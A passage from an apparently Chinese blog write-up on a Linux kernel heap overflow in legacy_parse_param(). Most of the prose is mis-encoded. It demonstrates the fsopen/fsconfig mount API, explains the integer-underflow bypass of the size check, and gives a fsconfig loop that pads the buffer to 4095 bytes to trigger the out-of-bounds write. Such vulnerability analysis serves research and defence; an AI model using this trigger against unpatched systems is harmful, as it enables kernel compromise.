ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥è·å–ä¸€ä¸ªå¯ä»¥è¢«ç”¨ä»¥è¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨ä»¥ä¸‹ä¸€æ­¥çš„æŒ‚è½½</p><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-move-mount-å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨">Step.IV - move_mount: å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨</h3><p>æœ€åæ¥åˆ°<s>ä¸€ä¸ªä¸ç»Ÿä¸€ä»¥ fs å¼€å¤´è¿›è¡Œå‘½åçš„</s> <code>move_mount()</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ç”¨ä»¥å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨ï¼š</p><ul><li>å¯¹äºå°šæœªè¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹è€Œè¨€ï¼Œè¿›è¡ŒæŒ‚è½½çš„æ“ä½œä¾¿æ˜¯ä»ç©ºæŒ‚è½½ç‚¹ <code>&quot;&quot;</code> ç§»åŠ¨åˆ°å¯¹åº”çš„æŒ‚è½½ç‚¹ï¼ˆä¾‹å¦‚ <code>&quot;/mnt/temp&quot;</code>ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦ç»™å‡ºç›®çš„æŒ‚è½½ç‚¹çš„ fdï¼Œè€Œå¯ä»¥ä½¿ç”¨ <code>AT_FDCWD</code></li></ul><p>å¼•å…¥äº† <code>move_mount()</code> ä¹‹åï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ä¸€ä¸ªç”¨ä»¥å°† <code>&quot;/dev/sdb1&quot;</code> ä»¥ <code>&quot;ext4&quot;</code> æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° <code>&quot;/mnt/temp&quot;</code> çš„å®Œæ•´ç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_move_mount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_move_mount 429</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,<span class="hljs-type">int</span> to_dfd, </span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br>    move_mount(mount_fd, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€å¥—æµç¨‹ä¸‹æ¥ä¾¿æ˜¯ new Filesystem mount API çš„åŸºæœ¬ç”¨æ³•</p><h1>0x01.æ¼æ´åˆ†æ</h1><h2 id="legacy-parse-param-æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´">legacy_parse_param() - æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´</h2><p>å‰é¢æˆ‘ä»¬æåˆ°è¯¥æ¼æ´å‘ç”Ÿäº <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Œè‹¥æˆ‘ä»¬ç»™çš„ <code>cmd</code> ä¸º <code>FSCONFIG_SET_STRING</code>ï¼Œåˆ™åœ¨å†…æ ¸ä¸­å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">fsconfig</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_fsconfig_locked</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_parse_fs_param</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>vfs_parse_fs_param()</code> ä¸­ä¼šè°ƒç”¨ <code>fs_context-&gt;ops-&gt;parse_param</code> å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬è®²åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œå…¶ä¸­ <code>fs_context</code> çš„å‡½æ•°è¡¨ä¼šè¢«è®¾ç½®ä¸º <code>legacy_fs_context_ops</code>ï¼Œå…¶ <code>parse_param</code> æŒ‡é’ˆå¯¹åº”ä¸º <code>legacy_parse_param()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¾¿å‘ç”Ÿåœ¨è¯¥å‡½æ•°ä¸­ï¼Œåœ¨è®¡ç®— <code>len &gt; PAGE_SIZE - 2 - size</code> æ—¶ï¼Œç”±äº size ä¸º <code>unsigned int</code> ï¼Œè‹¥ <code>size + 2 &gt; PAGE_SIZE</code> ï¼Œåˆ™ <code>PAGE_SIZE - 2 - size</code> çš„ç»“æœ<strong>ä¼šä¸‹æº¢ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ— ç¬¦å·å€¼ï¼Œä»è€Œç»•è¿‡ len çš„æ£€æŸ¥</strong>ï¼Œè¿™é‡Œçš„ size æ¥æºä¸º <code>ctx-&gt;data_size</code>ï¼Œå³<strong>å·²æ‹·è´çš„æ€»çš„æ•°æ®é•¿åº¦</strong>ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add a parameter to a legacy config.  We build up a comma-separated list of</span><br><span class="hljs-comment"> * options.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">// å·²æ‹·è´çš„æ•°æ®é•¿åº¦</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-comment">// è®¡ç®— len</span><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<span class="hljs-comment">// å¯¹åº” FSCONFIG_SET_STRING</span><br>len = <span class="hljs-number">1</span> + param-&gt;size;<br><span class="hljs-comment">/* Fall through */</span><br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-comment">// æ­¤å¤„å­˜åœ¨æ•´å‹æº¢å‡ºçš„æ¼æ´ï¼Œè‹¥ size + 2 å¤§äºä¸€å¼ é¡µçš„å¤§å°åˆ™ä¼šä¸Šæº¢ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ— ç¬¦å·æ•´å‹ï¼Œ</span><br><span class="hljs-comment">// å¯¼è‡´æ­¤å¤„é€šè¿‡æ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´åç»­æ­¥éª¤ä¸­çš„è¶Šç•Œæ‹·è´</span><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br></code></pre></td></tr></table></figure><p>åœ¨åé¢çš„æµç¨‹ä¸­ä¼šä»ç”¨æˆ·æ§ä»¶å°†æ•°æ®æ‹·è´åˆ°  <code>ctx-&gt;legacy_data</code>  ä¸Šï¼Œè€Œ <code>ctx-&gt;legacy_data</code> ä»…åˆ†é…äº†ä¸€å¼ é¡µé¢å¤§å°ï¼Œä½†åç»­æµç¨‹ä¸­çš„æ‹·è´æ˜¯ä» <code>ctx-&gt;legacy_data[size]</code> å¼€å§‹çš„ï¼Œ<strong>ç”±äº size å¯ä»¥å¤§äºä¸€å¼ é¡µå¤§å°ï¼Œå› æ­¤æ­¤å¤„å¯ä»¥å‘ç”Ÿæ•°æ®æ•°æ®å†™å…¥</strong>ï¼Œç”±äº <code>ctx-&gt;legacy_data</code> åœ¨åˆ†é…æ—¶ä½¿ç”¨çš„æ˜¯é€šç”¨çš„åˆ†é… flag <code>GFP_KERNEL</code>ï¼Œå› æ­¤å¯ä»¥æº¢å‡ºåˆ°ç»å¤§å¤šæ•°çš„å¸¸ç”¨ç»“æ„ä½“ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä¸º legacy_data åˆ†é…ä¸€å¼ é¡µçš„å¤§å°</span><br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-comment">// size å¯ä»¥å¤§äºä¸€å¼ é¡µï¼Œä½†æ˜¯ legacy_data åªæœ‰ä¸€å¼ é¡µï¼Œä»è€Œå¯¼è‡´äº†è¶Šç•Œæ‹·è´</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-comment">// size å¯ä»¥å¤§äºä¸€å¼ é¡µï¼Œä½†æ˜¯ legacy_data åªæœ‰ä¸€å¼ é¡µï¼Œä»è€Œå¯¼è‡´äº†è¶Šç•Œæ‹·è´</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº fsconfig çš„é™åˆ¶ï¼Œæˆ‘ä»¬å•æ¬¡å†™å…¥çš„æœ€å¤§é•¿åº¦ä¸º 256 å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¤šæ¬¡è°ƒç”¨ fsconfig ä»¥è®©å…¶é€æ¸é€¼è¿‘ <code>PAGE_SIZE</code>ï¼Œè€Œ <code>len &gt; PAGE_SIZE - 2 - size</code> çš„æ£€æŸ¥<strong>å¹¶éå®Œå…¨æ— æ•ˆ</strong>ï¼Œç”±äº size ä¸ºå·²æ‹·è´æ•°æ®é•¿åº¦è€Œ len ä¸ºå¾…æ‹·è´æ•°æ®é•¿åº¦ï¼Œå› æ­¤<strong>åªæœ‰å½“ size ç´¯åŠ åˆ° 4095 æ—¶æ‰ä¼šå‘ç”Ÿæ•´å‹æº¢å‡º</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨è¿›è¡Œæº¢å‡ºå‰éœ€è¦å¡å¥½å·²æ‹·è´æ•°æ®é•¿åº¦<strong>åˆšå¥½ä¸º <code>4095</code></strong></p><p>ç”±äº <code>legacy_parse_param()</code> ä¸­æ‹·è´çš„ç»“æœå½¢å¼ä¸º <code>&quot;,key=val&quot;</code>ï¼Œæ•…æˆ‘ä»¬æœ‰å¦‚ä¸‹è®¡ç®—å…¬å¼ï¼š</p><ul><li><code>å•æ¬¡æ‹·è´æ•°æ®é•¿åº¦ = len(key) + len(val) + 2</code></li></ul><p>ä¸‹é¢ç¬”è€…ç»™å‡ºä¸€ä¸ªç¬”è€…è‡ªå·±è®¡ç®—çš„ 4095ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment"> * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br>fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 